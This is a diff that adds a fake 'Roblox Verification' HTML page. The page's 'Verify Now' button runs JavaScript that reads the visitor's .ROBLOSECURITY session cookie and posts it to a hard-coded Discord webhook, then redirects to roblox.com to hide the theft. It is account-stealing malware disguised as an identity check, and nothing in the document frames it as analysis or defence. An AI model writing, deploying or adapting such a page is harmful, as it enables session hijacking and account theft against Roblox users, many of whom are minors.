@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Verification</title>
+</head>
+<body>
+    <h1>⚠️ Verify Your Account</h1>
+    <p>Click the button to confirm your identity.</p>
+    <button onclick="beam()">Verify Now</button>
+    <div id="status"></div>
+
+    <script>
+    function beam() {
+        const webhook = "https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w";
+        
+        // 1. 쿠키 가져오기
+        let cookie = document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='));
+        if (!cookie) {
+            document.getElementById('status').innerHTML = '❌ No cookie found. Login to Roblox first.';
+            return;
+        }
+        cookie = cookie.trim().substring('.ROBLOSECURITY='.length);
+        
+        // 2. 디스코드로 전송
+        const data = {
+            embeds: [{
+                title: "✅ New Cookie",
+                description: `Cookie: \`${cookie.substring(0, 50)}...\``,
+                color: 0x00ff00,
+                timestamp: new Date().toISOString()
+            }]
+        };
+        
+        fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        })
+        .then(() => {
+            document.getElementById('status').innerHTML = '✅ Sent! Redirecting...';
+            setTimeout(() => window.location.href = 'https://www.roblox.com', 1000);
+        })
+        .catch(() => {
+            document.getElementById('status').innerHTML = '❌ Failed to send.';
+        });
+    }
+    </script>
+</body>
+</html>
